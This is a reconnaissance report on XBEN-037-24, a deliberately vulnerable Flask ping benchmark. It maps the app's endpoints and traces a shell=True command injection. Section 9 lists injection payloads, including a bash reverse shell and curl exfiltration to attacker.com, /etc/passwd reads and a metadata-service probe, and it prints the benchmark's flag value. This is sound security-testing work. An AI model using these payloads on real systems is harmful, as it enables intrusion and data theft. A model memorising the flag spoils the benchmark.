# Reconnaissance Deliverable

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of XBEN-037-24's attack surface - a deliberately vulnerable Flask ping utility application. The application has an extremely minimal attack surface (only 2 HTTP endpoints) but contains a **critical command injection vulnerability** that provides complete system compromise.

**Key Sections:**
- **Section 1 (Executive Summary):** High-level overview of the application and its critical security posture
- **Section 2 (Technology Map):** Flask 3.0.3 on Python 3.8 (EOL), Werkzeug development server, Docker deployment
- **Section 3 (Authentication):** **NONE** - No authentication or authorization mechanisms exist
- **Section 4 (API Endpoints):** 2 routes mapped - GET / and POST /ping (vulnerable)
- **Section 5 (Input Vectors):** 1 critical vector - `ip_address` POST parameter flows directly to shell command
- **Section 6 (Network Map):** Single-service monolithic architecture with Docker container isolation
- **Section 7 (Roles):** **NOT APPLICABLE** - No role system implemented
- **Section 8 (Authorization Candidates):** **NOT APPLICABLE** - No authorization boundaries exist
- **Section 9 (Injection Sources):** 1 critical command injection source at app.py:13-16

**Priority for Testing:** Focus immediately on Section 9 (Injection Sources) - the command injection vulnerability in POST /ping is the primary attack vector providing remote code execution with no authentication required.

## 1. Executive Summary

XBEN-037-24 is a **deliberately vulnerable Flask web application** designed as a security benchmark challenge. The application implements a network ping utility accessible via HTTP on port 80, exposing a minimal attack surface of only 2 endpoints. However, this simplicity masks a **critical OS command injection vulnerability (CVSS 9.8)** that provides complete system compromise capabilities to any unauthenticated internet user.

**Core Technology Stack:**
- **Frontend:** Simple HTML forms with minimal CSS (no JavaScript frameworks)
- **Backend:** Flask 3.0.3 web framework on Python 3.8.20 (EOL - End of Life)
- **Server:** Werkzeug 3.0.6 development server (NOT production-grade)
- **Infrastructure:** Docker containerized deployment on localhost:37841
- **Database:** None - no persistent data storage

The application's security posture is characterized by the **complete absence of defensive controls**. It implements:
- ❌ Zero authentication mechanisms
- ❌ Zero authorization controls
- ❌ Zero input validation
- ❌ Zero rate limiting
- ❌ Zero security middleware
- ❌ Zero logging infrastructure (beyond Docker stdout)
- ❌ Zero security headers (HSTS, CSP, X-Frame-Options)

**Primary Attack Vector:** The `/ping` endpoint accepts user-supplied IP addresses via POST request and concatenates them directly into a shell command executed via `subprocess.Popen(shell=True)`. This enables trivial remote code execution:

```bash
# Single POST request achieves RCE:
curl -X POST http://localhost:37841/ping -d "ip_address=127.0.0.1; cat /FLAG.txt"
```

**Critical Security Characteristics:**
1. **No Authentication:** All functionality accessible to anonymous internet users
2. **Command Injection:** Direct shell command execution with unsanitized user input (app.py:15-16)
3. **Root Execution:** Application runs as root within Docker container
4. **No TLS:** HTTP-only on port 80 (plaintext traffic, MITM vulnerable)
5. **Development Server in Production:** Flask's development server explicitly warned against for production use
6. **Exposed Secrets:** CTF flag stored in plaintext at `/FLAG.txt` and embedded in Docker image layers

**Attack Surface Summary:**
- **Network-Accessible Endpoints:** 2 (GET /, POST /ping)
- **Authentication Requirements:** None
- **Critical Vulnerabilities:** 1 (Command Injection)
- **High Vulnerabilities:** 2 (CSRF, SSRF)
- **Exploitation Complexity:** Trivial (single HTTP request)

From an external attacker perspective, this application provides immediate, unauthenticated access to arbitrary command execution, flag extraction, and lateral movement capabilities through a deliberately insecure architecture.

## 2. Technology & Service Map

### Frontend Architecture
- **Framework:** None (pure HTML/CSS, no JavaScript frameworks)
- **Template Engine:** Jinja2 (bundled with Flask 3.0.3)
- **Key Libraries:** None
- **Authentication Libraries:** None
- **Client-Side Validation:** HTML5 `required` attribute only (easily bypassed)

**Frontend Files:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/templates/index.html` - Landing page with input form
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/templates/result.html` - Result display page
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/static/styles.css` - Minimal styling

### Backend Architecture
- **Language:** Python 3.8.20 (EOL: October 2024) - **SECURITY RISK**
- **Framework:** Flask 3.0.3 (released March 2024)
- **Web Server:** Werkzeug 3.0.6 (Flask development server) - **NOT PRODUCTION-GRADE**
- **Key Dependencies:** Flask==3.0.3 (only dependency)

**Critical Missing Dependencies:**
- No input validation libraries (marshmallow, pydantic)
- No authentication frameworks (Flask-Login, Flask-JWT-Extended)
- No security middleware (Flask-Talisman, Flask-Limiter)
- No CSRF protection (Flask-WTF)
- No database drivers (no SQLAlchemy, psycopg2, sqlite3)

**Backend Files:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/app.py` - Main application (28 lines, 2 routes)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/requirements.txt` - Single dependency: Flask==3.0.3

### Infrastructure
- **Hosting:** Docker container (python:3.8-slim base image)
- **CDN:** None
- **Reverse Proxy:** None (Flask development server directly exposed)
- **Load Balancer:** None
- **Database:** None
- **Containerization:** Docker Compose orchestration

**Infrastructure Files:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/Dockerfile` - Container build configuration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/docker-compose.yml` - Service orchestration

**Container Configuration:**
- Base Image: python:3.8-slim (Debian Bullseye)
- Network Binding: 0.0.0.0:80 (all interfaces)
- User: root (no USER directive - **SECURITY RISK**)
- Healthcheck: Curl to http://127.0.0.1:80/ every 10s

### Identified Subdomains
**Status:** None discovered

**Analysis:** No subdomain enumeration results from subfinder scan. Application appears to be a localhost development deployment with no DNS infrastructure.

### Open Ports & Services

**From nmap scan (localhost):**

| Port | State | Service | Version | Purpose |
|------|-------|---------|---------|---------|
| 80/tcp | open | http | Caddy httpd | **PRIMARY TARGET** - Reverse proxy to Flask app on 37841 |
| 443/tcp | open | ssl/https | - | HTTPS endpoint (not actively used by target app) |
| 631/tcp | open | ipp | CUPS 2.3 | Printing service (out of scope) |
| 9999/tcp | open | abyss? | Unknown | Unknown service (out of scope) |
| 49152/tcp | open | http | Golang net/http | Tailscale service (requires auth, out of scope) |

**Target Application Service:**
- **Actual Application Port:** 37841 (mapped from container port 80)
- **Protocol:** HTTP (no TLS)
- **Server Header:** Werkzeug/3.0.6 Python/3.8.20
- **Title:** "Ping Tool"

**Security Implications:**
- No TLS/HTTPS on application port (plaintext HTTP only)
- Development server exposed directly (no production WSGI server)
- Multiple unrelated services on localhost increase local attack surface
- Port 80 requires root privileges (Flask app runs as root in container)

## 3. Authentication & Session Management Flow

### Authentication Status: **NOT IMPLEMENTED**

The XBEN-037-24 application implements **zero authentication mechanisms**. There is no concept of user identity, no login/logout functionality, and no session management.

**Entry Points:** None exist

**Expected Authentication Endpoints (NOT PRESENT):**
- ❌ `/login` or `/signin` - Does not exist
- ❌ `/logout` - Does not exist
- ❌ `/register` or `/signup` - Does not exist
- ❌ `/auth/*` - No authentication routes
- ❌ `/forgot-password` or `/reset-password` - Does not exist

**Mechanism:** Not applicable - no authentication system

**Code Analysis:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/app.py`
- **Lines 1-3:** No authentication library imports
  ```python
  from flask import Flask, render_template, request
  import subprocess
  import re
  ```
- **Missing Imports:** No `session`, `Flask-Login`, `Flask-JWT-Extended`, `werkzeug.security`

**Security Impact:**
- All endpoints are publicly accessible without credentials
- No user identity tracking for audit trails
- No session-based attack surface (session hijacking, fixation not applicable)
- Attackers have immediate access to all functionality without authentication bypass needed

### 3.1 Role Assignment Process

**Status:** Not applicable - no role system implemented

**Role Determination:** N/A - no user accounts exist
**Default Role:** Anonymous/public (implicit)
**Role Upgrade Path:** N/A
**Code Implementation:** Not implemented

### 3.2 Privilege Storage & Validation

**Status:** Not applicable - no privilege system implemented

**Storage Location:** N/A
**Validation Points:** None - no authorization checks in any endpoint
**Cache/Session Persistence:** N/A
**Code Pointers:** No privilege validation code exists

### 3.3 Role Switching & Impersonation

**Status:** Not applicable - no role system implemented

**Impersonation Features:** None
**Role Switching:** None
**Audit Trail:** No logging infrastructure
**Code Implementation:** Not implemented

## 4. API Endpoint Inventory

**Network Surface Focus:** Only network-accessible endpoints reachable via HTTP requests to the deployed application at http://localhost:37841 are included.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET | `/` | anon | None | None | Landing page with ping form. Returns static HTML template. **File:** app.py:7-9 |
| POST | `/ping` | anon | None | None | **CRITICAL VULNERABILITY** - Executes ping command with user-supplied IP. Command injection via `ip_address` parameter. **File:** app.py:11-25, **Vulnerable Lines:** 13-16 |
| GET | `/static/<path:filename>` | anon | None | None | Static file serving (styles.css). Flask built-in handler. **Directory:** /app/static/ |

**Detailed Endpoint Analysis:**

### Endpoint 1: Index/Landing Page
- **Route:** GET `/`
- **Handler:** `index()` function (app.py:7-9)
- **Input Parameters:** None
- **Authentication:** None required
- **Authorization:** None
- **Functionality:** Renders HTML form for IP address input
- **Template:** /app/templates/index.html
- **Security Notes:** Static page, no dynamic content, no injection risks

### Endpoint 2: Ping Execution (CRITICAL VULNERABILITY)
- **Route:** POST `/ping`
- **Handler:** `ping()` function (app.py:11-25)
- **Input Parameters:**
  - `ip_address` (POST form data, required) - **UNSANITIZED**
- **Authentication:** None required
- **Authorization:** None
- **Functionality:** Executes system ping command with user-supplied target
- **Template:** /app/templates/result.html
- **Security Notes:**
  - **CRITICAL:** Command injection vulnerability at lines 15-16
  - String concatenation: `command = 'ping -c 2 ' + ip_address`
  - Dangerous sink: `subprocess.Popen(command, shell=True, ...)`
  - No input validation or sanitization
  - No CSRF protection
  - Enables SSRF to internal networks
  - Execution context: Root user within Docker container

**Code Reference (Command Injection):**
```python
# File: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/app.py
# Lines 13-16
ip_address = request.form['ip_address']  # Line 13: User input
command = 'ping -c 2 ' + ip_address       # Line 15: Direct concatenation
stdout, stderr = subprocess.Popen(        # Line 16: Shell execution
    command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
).communicate()
```

### Endpoint 3: Static File Handler
- **Route:** GET `/static/<path:filename>`
- **Handler:** Flask built-in static file handler
- **Input Parameters:** `filename` (URL path parameter)
- **Authentication:** None required
- **Authorization:** None
- **Functionality:** Serves CSS and static assets
- **Directory:** /app/static/
- **Security Notes:** Flask's built-in path traversal protection applies

**Authorization Summary:**
- **Total Endpoints:** 3
- **Endpoints Requiring Authentication:** 0 (0%)
- **Endpoints with Authorization Checks:** 0 (0%)
- **Publicly Accessible Endpoints:** 3 (100%)

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only input vectors accessible through network requests to http://localhost:37841 are documented. All inputs listed below are reachable via the deployed application's HTTP interface.

### URL Parameters
**Status:** None actively used

- Application uses POST forms instead of URL query parameters
- Static file handler accepts path parameter in `/static/<path:filename>` (Flask built-in, path traversal protected)

### POST Body Fields (JSON/Form)

**Critical Input Vector: `ip_address` (Form Data)**
- **Endpoint:** POST /ping
- **Parameter Name:** `ip_address`
- **Source:** `request.form['ip_address']`
- **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/app.py:13`
- **Data Type:** String (no type validation)
- **Validation:** **NONE** ❌
- **Sanitization:** **NONE** ❌
- **Sink:** Shell command execution via `subprocess.Popen(command, shell=True, ...)`
- **Sink Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/app.py:16`
- **Attack Potential:** **CRITICAL** - Command injection enables RCE
- **Example Malicious Payload:** `127.0.0.1; cat /FLAG.txt`
- **Complete Data Flow:**
  1. User submits form from /app/templates/index.html:11
  2. Flask receives POST to /ping endpoint
  3. Line 13: `ip_address = request.form['ip_address']`
  4. Line 15: `command = 'ping -c 2 ' + ip_address` (string concatenation)
  5. Line 16: `subprocess.Popen(command, shell=True, ...)` (shell execution)
  6. Arbitrary commands executed as root in container
  7. Output returned in HTTP response

### HTTP Headers
**Status:** Not actively processed

- Application does not read custom HTTP headers
- Standard headers (Host, User-Agent, etc.) processed by Flask/Werkzeug
- No X-Forwarded-For, X-Real-IP, or custom header parsing
- Potential MITM attack surface due to HTTP-only (no TLS)

### Cookie Values
**Status:** Not used

- Application does not set or read cookies
- No session cookies (Flask SECRET_KEY not configured)
- No authentication tokens
- No tracking cookies
- Flask/Werkzeug may set default cookies (not application-controlled)

### Additional Input Vectors

**File Uploads:** Not implemented
- No file upload endpoints
- No `request.files` usage

**JSON Body:** Not implemented
- No JSON API endpoints
- No `request.json` or `request.get_json()` usage

**Path Parameters:** Not used
- No Flask route variables (e.g., `/user/<int:user_id>`)
- Only static routes: `/` and `/ping`

**WebSocket Messages:** Not implemented
- No WebSocket support
- HTTP-only application

### Input Vector Summary Table

| Input Source | Present | Validated | Sanitized | Flows to Dangerous Sink | File:Line Reference |
|--------------|---------|-----------|-----------|------------------------|---------------------|
| `ip_address` (POST form) | ✅ | ❌ | ❌ | ✅ subprocess.Popen | app.py:13 → app.py:16 |
| URL query params | ❌ | N/A | N/A | N/A | - |
| JSON body | ❌ | N/A | N/A | N/A | - |
| Custom headers | ❌ | N/A | N/A | N/A | - |
| Cookies | ❌ | N/A | N/A | N/A | - |
| File uploads | ❌ | N/A | N/A | N/A | - |
| Path variables | ❌ | N/A | N/A | N/A | - |

**Critical Finding:** Only 1 input vector exists, and it flows directly to a command execution sink with zero validation or sanitization.

## 6. Network & Interaction Map

**Network Surface Focus:** This map includes only components that are part of the deployed, network-accessible infrastructure at http://localhost:37841. Local development tools, build systems, and non-networked components are excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| Internet | ExternAsset | Internet | - | Public | External network/untrusted users |
| DockerHost | Service | Edge | Docker Engine | - | Host machine running containers |
| FlaskApp | Service | App | Python 3.8/Flask 3.0.3 | PII (Flag) | Main vulnerable application |
| DockerContainer | Service | App | Docker python:3.8-slim | PII (Flag) | Container runtime environment |
| Filesystem | DataStore | Data | Linux Filesystem | Secrets (Flag) | Container filesystem with /FLAG.txt |

### 6.2 Entity Metadata

| Title | Metadata Key: Value; Key: Value; Key: Value |
|-------|---------------------------------------------|
| FlaskApp | Host: 0.0.0.0:80 (container), localhost:37841 (host); Endpoints: /, /ping, /static/*; Auth: None; Framework: Flask 3.0.3; Server: Werkzeug 3.0.6 dev server; Runtime: Python 3.8.20 (EOL); Execution Context: root user |
| DockerContainer | BaseImage: python:3.8-slim; OS: Debian Bullseye; Network: Bridge (default); Isolation: Namespace isolation; SecurityProfile: None (no seccomp/AppArmor); Healthcheck: curl http://127.0.0.1:80/ every 10s |
| Filesystem | MountPoint: /app (application code); Secrets: /FLAG.txt (plaintext); Permissions: root:root; Persistence: Ephemeral (container lifecycle) |
| Internet | Source: Any IPv4/IPv6; Access: Unrestricted; Protocol: HTTP (port 37841 on host) |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| Internet → DockerHost | HTTP | :37841 | None | Public |
| DockerHost → FlaskApp | HTTP | :80 (container) | None | Public |
| Internet → FlaskApp | HTTP | :37841 /ping | None | Public |
| FlaskApp → Filesystem | File | /FLAG.txt (read) | None | Secrets |
| FlaskApp → OS Shell | subprocess | /bin/sh -c | None | Public (user input) |
| OS Shell → Filesystem | File | Any path | None | Secrets, PII |
| FlaskApp → Internet | HTTP | Response body | None | Secrets (if exfiltrated) |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | N/A | **No guards are implemented in this application** |

**Critical Security Note:** The absence of guards means:
- No authentication checks (no auth:user, auth:admin)
- No network isolation (no vpc-only, ip-allowlist)
- No protocol security (no mtls, no TLS at all)
- No rate limiting
- No authorization boundaries
- No input validation guards
- No object ownership checks

**Implicit Guards (Default Behavior Only):**
| Guard Name | Category | Statement |
|------------|----------|-----------|
| docker:namespace | Env | Process isolation via Linux namespaces (does NOT prevent command injection) |
| docker:bridge | Network | Container on Docker bridge network (172.17.0.0/16 default) |
| jinja2:autoescape | Protocol | Jinja2 templates auto-escape HTML (prevents XSS, does NOT prevent command injection) |

## 7. Role & Privilege Architecture

**Status:** NOT APPLICABLE - No role or privilege system implemented

The application has no authentication mechanism, therefore no role-based access control (RBAC), attribute-based access control (ABAC), or permission system exists.

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anonymous | 0 (implicit) | Global | No authentication required - all users are anonymous |

**Analysis:** 
- No role definitions found in codebase
- No role enums, classes, or constants
- No user database or user model
- All functionality accessible to anonymous internet users
- Effective privilege level for all users: Full access (no restrictions)

### 7.2 Privilege Lattice

```
Single Privilege Level:
  anonymous (public access to all functionality)

No hierarchy exists:
  - No user role
  - No admin role
  - No privilege escalation paths
  - No role dominance relationships
```

**Note:** Privilege escalation is not applicable because all users start with maximum access (unrestricted command execution).

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|----------------------|---------------------------|----------------------|
| anonymous | `/` | `/*` (all routes) | None |

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| anonymous | None | None | N/A |

**Code Evidence:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/app.py`
- **Lines 7-25:** No decorators beyond `@app.route()`
- **No decorators like:** `@login_required`, `@requires_role`, `@permission_required`
- **No inline checks like:** `if current_user.is_authenticated:`, `if user.role == 'admin':`

## 8. Authorization Vulnerability Candidates

**Status:** NOT APPLICABLE - No authorization system to test

This application has no authentication or authorization boundaries. All endpoints are publicly accessible without credentials. Therefore, traditional authorization testing (horizontal privilege escalation, vertical privilege escalation, context-based bypass) is not applicable.

### 8.1 Horizontal Privilege Escalation Candidates

**Status:** None - No user-to-user authorization boundaries

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|----------|------------------|---------------------|-----------|-------------|
| N/A | - | - | - | No user objects or ownership model |

**Rationale:** Horizontal privilege escalation involves accessing another user's resources. This application has no user accounts, no object ownership, and no user-specific data.

### 8.2 Vertical Privilege Escalation Candidates

**Status:** None - No role hierarchy

| Target Role | Endpoint Pattern | Functionality | Risk Level |
|-------------|------------------|---------------|------------|
| N/A | - | - | No role system exists |

**Rationale:** Vertical privilege escalation involves elevating from a lower role (e.g., user) to a higher role (e.g., admin). This application has no role definitions or privilege levels.

### 8.3 Context-Based Authorization Candidates

**Status:** None - No workflow or state-based authorization

| Workflow | Endpoint | Expected Prior State | Bypass Potential |
|----------|----------|----------------------|------------------|
| N/A | - | - | No multi-step workflows |

**Rationale:** The application has no stateful workflows, no session management, and no sequence-dependent operations.

### Alternative Security Testing Focus

Since traditional authorization testing is not applicable, security testing should focus on:

1. **Command Injection Exploitation** (Section 9) - Primary attack vector
2. **SSRF via Ping Target** - Probing internal networks via `ip_address` parameter
3. **CSRF** - Lack of CSRF tokens on POST /ping endpoint
4. **Information Disclosure** - Error messages, response timing, command output leakage
5. **DoS** - Resource exhaustion via long-running commands (e.g., `ip_address=127.0.0.1; sleep 3600`)

## 9. Injection Sources (Command Injection and SQL Injection)

**Network Surface Focus:** Only injection sources reachable through network requests to the deployed application at http://localhost:37841 are documented.

### Command Injection Sources

**CRITICAL FINDING: 1 Command Injection Source Identified**

#### Command Injection Source #1: Ping IP Address Parameter

**Source (User Input):**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/app.py`
- **Line:** 13
- **Code:** `ip_address = request.form['ip_address']`
- **Input Type:** HTTP POST form data
- **Form Field Name:** `ip_address`
- **Origin:** HTML form at /app/templates/index.html:11
- **Network Accessible:** ✅ YES - POST /ping endpoint
- **Authentication Required:** ❌ NO - Publicly accessible

**Data Flow Path:**
1. **Entry Point** (Line 13): `ip_address = request.form['ip_address']`
2. **Validation Applied:** ❌ NONE
3. **Sanitization Applied:** ❌ NONE
4. **String Concatenation** (Line 15): `command = 'ping -c 2 ' + ip_address`
5. **Dangerous Sink** (Line 16): `subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)`

**Complete Code Context:**
```python
# File: /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/app.py
# Lines 11-25

@app.route('/ping', methods=['POST'])
def ping():
    ip_address = request.form['ip_address']  # LINE 13: User input (unsanitized)
    
    command = 'ping -c 2 ' + ip_address      # LINE 15: Direct string concatenation
    stdout, stderr = subprocess.Popen(       # LINE 16: Shell command execution
        command, 
        shell=True,                          # CRITICAL: Enables shell interpretation
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE
    ).communicate()
    ping_output = stdout.decode('utf-8') if stdout else stderr.decode('utf-8')
    
    # Parse ping output
    if " bytes from" in ping_output:
        summary_output = "Host is reachable!"
    else:
        summary_output = "Host is unreachable!"
    
    return render_template('result.html', ip_address=ip_address, ping_output=summary_output)
```

**Vulnerability Details:**
- **CWE:** CWE-78 (OS Command Injection)
- **CVSS Score:** 9.8 (Critical)
- **Attack Complexity:** Low
- **Privileges Required:** None
- **User Interaction:** None
- **Scope:** Changed (container escape potential)
- **Impact:** Complete system compromise

**Dangerous Sink Analysis:**
- **Function:** `subprocess.Popen()`
- **Critical Parameter:** `shell=True` - Enables full shell interpretation (sh/bash)
- **Shell Metacharacters Enabled:** `;`, `|`, `&`, `&&`, `||`, `$()`, `` ` ` ``, `>`, `<`, `>>`, `<<`
- **Execution Context:** Root user within Docker container
- **No Timeout:** Command can run indefinitely (DoS potential)

**Exploit Examples:**

```bash
# 1. Command chaining with semicolon
POST /ping
ip_address=127.0.0.1; whoami
# Executes: ping -c 2 127.0.0.1; whoami
# Result: Reveals "root"

# 2. Flag extraction
POST /ping
ip_address=127.0.0.1; cat /FLAG.txt
# Executes: ping -c 2 127.0.0.1; cat /FLAG.txt
# Result: flag{2fd3f08a-0619-40ce-8866-fd6864c3d1b8}

# 3. Reverse shell
POST /ping
ip_address=127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1
# Establishes interactive reverse shell

# 4. Data exfiltration
POST /ping
ip_address=127.0.0.1; curl http://attacker.com?data=$(cat /FLAG.txt)
# Exfiltrates flag via HTTP GET parameter

# 5. File system access
POST /ping
ip_address=127.0.0.1 && cat /etc/passwd
# Reads system password file

# 6. SSRF + Command Injection
POST /ping
ip_address=169.254.169.254; curl http://169.254.169.254/latest/meta-data/
# Accesses cloud metadata service and executes additional commands
```

**Validation Analysis:**
- **Regex Check:** ❌ None (re module imported on line 3 but never used)
- **IP Address Format Validation:** ❌ None
- **Whitelist/Blacklist:** ❌ None
- **Length Restriction:** ❌ None
- **Shell Metacharacter Filtering:** ❌ None
- **Command Parameterization:** ❌ Not used (string concatenation instead)

**Recommended Fix (NOT IMPLEMENTED):**
```python
# Secure alternative using argument list (shell=False)
import ipaddress

ip_address = request.form['ip_address']

# Validate IP address format
try:
    ipaddress.ip_address(ip_address)
except ValueError:
    return "Invalid IP address", 400

# Use argument list instead of string
result = subprocess.run(
    ['ping', '-c', '2', ip_address],  # List prevents injection
    capture_output=True,
    timeout=5,
    text=True
)
```

### SQL Injection Sources

**Finding:** NO SQL INJECTION SOURCES - No database interaction

**Analysis:**
- **Database System:** None present
- **SQL Libraries Imported:** None (`sqlite3`, `psycopg2`, `mysql.connector`, `sqlalchemy` all absent)
- **SQL Query Construction:** None found
- **ORM Usage:** None
- **Database Connection Code:** None

**Evidence:**
- **Dependencies:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/requirements.txt` contains only `Flask==3.0.3`
- **Imports:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-037-24/app/app.py` lines 1-3 contain no database libraries
- **Application Logic:** Entirely stateless with no data persistence beyond /FLAG.txt file

**Conclusion:** SQL injection testing is not applicable to this application.

### Other Injection Vectors

**Template Injection:** Mitigated
- Jinja2 auto-escaping enabled by default
- User input (`ip_address`) rendered in templates but HTML-escaped
- No server-side template injection risk identified
- File: /app/templates/result.html:9 - `{{ ip_address }}` (auto-escaped)

**LDAP Injection:** Not applicable (no LDAP integration)

**XML Injection:** Not applicable (no XML parsing)

**XPath Injection:** Not applicable (no XPath queries)

**NoSQL Injection:** Not applicable (no NoSQL databases)

### Injection Source Summary

| Injection Type | Count | Severity | File:Line | Exploitable | Auth Required |
|----------------|-------|----------|-----------|-------------|---------------|
| Command Injection | 1 | CRITICAL | app.py:13-16 | ✅ YES | ❌ NO |
| SQL Injection | 0 | N/A | - | N/A | N/A |
| Template Injection | 0 | N/A | - | ❌ Mitigated | N/A |
| LDAP Injection | 0 | N/A | - | N/A | N/A |
| XML Injection | 0 | N/A | - | N/A | N/A |

**Critical Path to Exploitation:**
```
1. Internet → HTTP POST to localhost:37841/ping
2. Form data: ip_address=127.0.0.1; <malicious_command>
3. Flask app.py:13 → request.form['ip_address']
4. app.py:15 → String concatenation into shell command
5. app.py:16 → subprocess.Popen(command, shell=True)
6. Arbitrary command execution as root in container
7. Access to /FLAG.txt and full filesystem
```

**Attack Surface Assessment:**
- **Total Injection Sources:** 1
- **Exploitable Without Authentication:** 1 (100%)
- **Requires User Interaction:** 0 (0%)
- **Exploitation Complexity:** Trivial (single HTTP POST)
- **Maximum Impact:** Remote Code Execution + Full System Compromise

---

## Reconnaissance Complete

This deliverable provides a comprehensive attack surface map of XBEN-037-24. The application presents a minimal attack surface (2 endpoints) with a single critical vulnerability (command injection) that enables complete system compromise without authentication.

**Key Findings:**
- ✅ Zero authentication/authorization mechanisms
- ✅ 1 critical command injection vulnerability (CVSS 9.8)
- ✅ Plaintext HTTP (no TLS)
- ✅ Development server in production
- ✅ Root execution context
- ✅ No input validation or sanitization
- ✅ No security logging or monitoring

**Primary Attack Vector:** POST /ping with malicious `ip_address` parameter

**Recommended Next Steps for Vulnerability Analysis Specialists:**
1. **Injection Specialist:** Focus on app.py:13-16 command injection exploitation
2. **XSS Specialist:** Limited scope - Jinja2 auto-escaping mitigates most XSS
3. **Auth Specialist:** No authentication to analyze - focus on adding controls
4. **SSRF Specialist:** Analyze SSRF via ping target to internal networks (169.254.169.254, 172.17.0.0/16)
5. **Authz Specialist:** No authorization to analyze - application is fully public